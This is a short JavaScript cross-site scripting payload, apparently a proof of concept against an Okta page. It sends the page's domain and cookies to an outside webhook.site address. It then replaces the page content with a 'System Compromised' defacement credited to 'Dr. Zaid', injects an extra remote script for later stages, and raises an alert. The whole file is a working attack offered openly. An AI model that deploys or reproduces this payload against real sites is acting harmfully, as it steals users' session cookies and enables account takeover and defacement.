// 💥 ADVANCED XSS PAYLOAD
(function() {
  console.log("🚀 Advanced Payload Started");

  // إرسال معلومات DOM و Cookie إلى Webhook
  fetch("https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site/xss?info=" 
        + encodeURIComponent(document.domain + " | " + document.cookie));

  // تعديل العنوان والعناصر الظاهرة
  document.title = "☠️ XSS OWNED - Okta POC";
  document.body.style.background = "#000";
  document.body.style.color = "#0f0";
  document.body.innerHTML = "<h1 style='font-size:3em;'>🔥 System Compromised</h1><p>XSS executed by Dr. Zaid</p>";

  // إدراج سكربت إضافي (لأي مرحلة لاحقة)
  var s = document.createElement('script');
  s.src = "https://cdn.jsdelivr.net/npm/marked/marked.min.js";
  document.head.appendChild(s);

  // تأكيد بصري
  alert("☠️ ADVANCED XSS TRIGGERED!");
  console.log("✅ Payload Complete");
})();
